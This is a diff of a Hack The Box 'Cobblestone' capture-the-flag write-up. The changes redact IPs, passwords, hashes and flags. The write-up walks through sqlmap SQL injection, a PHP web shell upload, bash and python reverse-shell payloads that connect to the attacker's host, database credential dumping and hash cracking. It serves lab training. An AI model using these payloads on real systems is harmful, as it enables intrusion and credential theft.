@@ -1,5 +1,6 @@
 ---
 title: Cobblestone [Insane]
+published: false
 date: 2025-08-15
 tags: [htb, linux, nmap, ffuf, sqlmap, burpsuite, curl, cobbler, xmlrpc, sqli, cracking, blind sqli, penelope, ssh]
 categories: [HTB Writeups]
@@ -15,10 +16,10 @@ Author: [c1sc0](https://app.hackthebox.com/users/34604)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.238.5 
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx 
 [sudo] password for kali: 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 11:33 EDT
-Nmap scan report for 10.129.238.5
+Nmap scan report for 10.129.xx.xx
 Host is up (0.33s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -37,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 36.59 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.238.5     cobblestone.htb
+10.129.xx.xx     cobblestone.htb
 ```
 
 ### Web Enumeration
@@ -56,7 +57,7 @@ It has a [minecraft-web-portal](https://github.com/bybilly/minecraft-web-portal)
 
 Let's add these to `/etc/hosts` file:
 ```bash
-10.129.238.5     cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb mc.cobblestone.htb
+10.129.xx.xx     cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb mc.cobblestone.htb
 ```
 
 For the `deploy.cobblestone.htb`, it still under development so we can not do anything with this one.
@@ -242,11 +243,11 @@ Then we use `sqlmap` with `--batch` to run it automatically.
 ```bash
 └─$ sqlmap -r req --batch
         ___
-       __H__                                                                                                                                                                                                                                                                                                                
- ___ ___["]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                                                                                                    
-|_ -| . [)]     | .'| . |                                                                                                                                                                                                                                                                                                   
-|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                                                                
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.6#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
@@ -341,11 +342,11 @@ We continue to enumrate the db privilege.
 ```bash
 └─$ sqlmap -r req --batch --privilege 
         ___
-       __H__                                                                                                                                                                                                                                                                                                                
- ___ ___[)]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                                                                                                    
-|_ -| . [,]     | .'| . |                                                                                                                                                                                                                                                                                                   
-|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                                                                
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.6#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
@@ -409,11 +410,11 @@ Next gonna check the database.
 ```bash
 └─$ sqlmap -r req --batch --dbs                                                                               
         ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[']_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                    
-|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.6#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
@@ -464,11 +465,11 @@ Let's check out the `vote` database.
 ```bash
 └─$ sqlmap -r req --batch -D vote --tables
         ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[.]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                    
-|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.6#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
@@ -577,11 +578,11 @@ Let's check out the apache virtual host config, for more details check out [Apac
 ```bash
 └─$ sqlmap -r req --batch --file-read /etc/apache2/sites-available/000-default.conf
         ___
-       __H__                                                                                                                                                                                                                                                                                                                
- ___ ___[']_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                                                                                                    
-|_ -| . [']     | .'| . |                                                                                                                                                                                                                                                                                                   
-|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                                                                
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.6#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
@@ -703,11 +704,11 @@ Now let's create `shell.php` and use `sqlmap` to upload and reverse shell.
 ```bash
 └─$ sqlmap -r req --batch --file-write shell.php --file-dest /var/www/vote/shell.php
         ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[.]_____ ___ ___  {1.9.6#stable}                                                                                                                                                                                                    
-|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.6#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
@@ -757,7 +758,7 @@ Success upload and checking out `whoami`.
 Next up, to reverse shell, we gonna use `base64` to encode the command.
 
 ```bash
-└─$ echo 'bash -i >& /dev/tcp/10.10.16.36/3333 0>&1' | base64
+└─$ echo 'bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1' | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi8zMzMzIDA+JjEK
 ```
 
@@ -765,7 +766,7 @@ Use the `penelope` to catch the reverse shell.
 
 ```bash
 └─$ penelope -p 3333 
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -794,20 +795,20 @@ So it looks like the bash command is not working. <br>
 &rarr; Gonna use the python command to catch the reverse shell.
 
 ```bash
-└─$ curl "http://vote.cobblestone.htb/shell.php?cmd=python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.36%22%2C3333%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22%2Fbin%2Fbash%22%29%27"
+└─$ curl "http://vote.cobblestone.htb/shell.php?cmd=python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.xx.xx.xx%22%2C3333%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22%2Fbin%2Fbash%22%29%27"
 ```
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [-] Spawn MANUALLY a new shell for this session to operate properly
 [-] Spawn MANUALLY a new shell for this session to operate properly
-[+] Got reverse shell from cobblestone.htb~10.129.176.173-UNIX 😍 Assigned SessionID <1>
+[+] Got reverse shell from cobblestone.htb~10.129.xx.xx-UNIX 😍 Assigned SessionID <1>
 [!] This shell is already PTY
 [!] Cannot detect shell. Abort upgrading...
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/cobblestone.htb~10.129.176.173-UNIX/2025_08_13-12_20_38-602.log 📜
+[+] Logging to /home/kali/.penelope/cobblestone.htb~10.129.xx.xx-UNIX/2025_08_13-12_20_38-602.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 [-] Spawn MANUALLY a new shell for this session to operate properly
 ls -la
@@ -845,7 +846,7 @@ www-data@cobblestone:/var/www/vote/db$ cat connection.php
 
 $dbserver = "localhost";
 $username = "voteuser";
-$password = "thaixu6eih0Iicho]irahvoh6aigh>ie";
+$password = "thaixu6eih0Iicho]irahvoh6aighxxx";
 $dbname = "vote";
 
 $conn = new mysqli($dbserver, $username, $password, $dbname);
@@ -859,7 +860,7 @@ if ($conn->connect_errno > 0) {
 Let's check out with `mysql` to see what we can find.
 
 ```bash
-www-data@cobblestone:/var/www/vote/db$ mysql -h 127.0.0.1 -u voteuser -p'thaixu6eih0Iicho]irahvoh6aigh>ie'                    p'
+www-data@cobblestone:/var/www/vote/db$ mysql -h 127.0.0.1 -u voteuser -p'thaixu6eih0Iicho]irahvoh6aighxxx'                    p'
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 70
 Server version: 10.11.11-MariaDB-0+deb12u1-log Debian 12
@@ -895,7 +896,7 @@ MariaDB [vote]> select * from users;
 +----+----------+-----------+----------+------------------------+--------------------------------------------------------------+
 | id | Username | FirstName | LastName | Email                  | Password                                                     |
 +----+----------+-----------+----------+------------------------+--------------------------------------------------------------+
-|  1 | admin    | Admin     |          | cobble@cobblestone.htb | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86 |
+|  1 | admin    | Admin     |          | cobble@cobblestone.htb | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./<SNIP>                |
 | 10 | 2fa0n    | conan     | shinichi | 2fa0n@gmail.com        | $2y$10$2zG2Gsy3XRjIvWz97QCEne2Av3Umb5xcG7QExxB9Y1JXmy/pkVY4e |
 +----+----------+-----------+----------+------------------------+--------------------------------------------------------------+
 2 rows in set (0.001 sec)
@@ -904,7 +905,7 @@ MariaDB [vote]> select * from users;
 ```bash
 └─$ hashid hash.txt                                        
 --File 'hash.txt'--
-Analyzing '$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86'
+Analyzing '$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./<SNIP>'
 [+] Blowfish(OpenBSD) 
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt 
@@ -954,7 +955,7 @@ www-data@cobblestone:/var/www/html/db$ cat connection.php
 
 $dbserver = "localhost";
 $username = "dbuser";
-$password = "aichooDeeYanaekungei9rogi0eMuo2o";
+$password = "aichooDeeYanaekungei9rogi0exxxxx";
 $dbname = "cobblestone";
 
 $conn = new mysqli($dbserver, $username, $password, $dbname);
@@ -969,7 +970,7 @@ if ($conn->connect_errno > 0) {
 Let's check out if we can got some credentials.
 
 ```bash
-www-data@cobblestone:/var/www/html/db$ mysql -h 127.0.0.1 -u dbuser -p'aichooDeeYanaekungei9rogi0eMuo2o'                  
+www-data@cobblestone:/var/www/html/db$ mysql -h 127.0.0.1 -u dbuser -p'aichooDeeYanaekungei9rogi0exxxxx'                  
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 2105
 Server version: 10.11.11-MariaDB-0+deb12u1-log Debian 12
@@ -1010,8 +1011,8 @@ MariaDB [cobblestone]> select * from users;
 +----+----------+-----------+----------+------------------------+-------+------------------------------------------------------------------+-------------+
 | id | Username | FirstName | LastName | Email                  | Role  | Password                                                         | register_ip |
 +----+----------+-----------+----------+------------------------+-------+------------------------------------------------------------------+-------------+
-|  1 | admin    | admin     | admin    | admin@cobblestone.htb  | admin | f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1 | *           |
-|  2 | cobble   | cobble    | stone    | cobble@cobblestone.htb | admin | 20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d | *           |
+|  1 | admin    | admin     | admin    | admin@cobblestone.htb  | admin | <SNIP>                                                           | *           |
+|  2 | cobble   | cobble    | stone    | cobble@cobblestone.htb | admin | <SNIP>                                                           | *           |
 +----+----------+-----------+----------+------------------------+-------+------------------------------------------------------------------+-------------+
 2 rows in set (0.001 sec)
 ```
@@ -1021,7 +1022,7 @@ Okay, so we got other type of hash to crack.
 ```bash
 └─$ hashid hashes.txt
 --File 'hashes.txt'--
-Analyzing 'f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1'
+Analyzing '<SNIP>'
 [+] Snefru-256 
 [+] SHA-256 
 [+] RIPEMD-256 
@@ -1031,7 +1032,7 @@ Analyzing 'f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1'
 [+] SHA3-256 
 [+] Skein-256 
 [+] Skein-512(256) 
-Analyzing '20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d'
+Analyzing '<SNIP>'
 [+] Snefru-256 
 [+] SHA-256 
 [+] RIPEMD-256 
@@ -1132,7 +1133,7 @@ Cracking performance lower than expected?
 * Create more work items to make use of your parallelization power:
   https://hashcat.net/faq/morework
 
-20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d:iluvdannymorethanyouknow
+<SNIP>:iluvdannymorethanxxxxxxx
 Approaching final keyspace - workload adjusted.           
 
                                                           
@@ -1159,20 +1160,12 @@ Started: Wed Aug 13 12:29:40 2025
 Stopped: Wed Aug 13 12:30:52 2025
 ```
 
-Got it `cobble:iluvdannymorethanyouknow`. <br>
+Got it `cobble:iluvdannymorethanxxxxxxx`. <br>
 &rarr; SSH to it and got the user flag.
 
 ```bash
 └─$ ssh cobble@cobblestone.htb         
 cobble@cobblestone.htb's password: 
-Linux cobblestone 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
 cobble@cobblestone:~$ ls -la
 total 32
 drwx------ 3 cobble cobble 4096 Jul 24 14:41 .
@@ -1184,7 +1177,7 @@ drwxr-xr-x 3 root   root   4096 Jul 24 14:41 ..
 drwx------ 2 cobble cobble 4096 Jul 24 14:41 .ssh
 -rw-r----- 2 root   cobble   33 Aug 13 15:39 user.txt
 cobble@cobblestone:~$ cat user.txt
-3cb03f28e1b74b95067009d4c43ab388
+3cb03fxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 BOOM! Got the `user.txt` flag.
@@ -1207,14 +1200,6 @@ So back to what we got that we found port `25151`, we gonna use ssh portfwarding
 ```bash
 └─$ ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
 cobble@cobblestone.htb's password: 
-Linux cobblestone 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
 cobble@cobblestone:~$
 ```
 
@@ -1296,7 +1281,7 @@ After running the script, we gonna manually XML-RPC call to get the file.
 <methodResponse>
 <params>
 <param>
-<value><string>bf043ee1dff63a36dd8daef225b1f343
+<value><string>bf043exxxxxxxxxxxxxxxxxxxxxxxxxx
 </string></value>
 </param>
 </params>
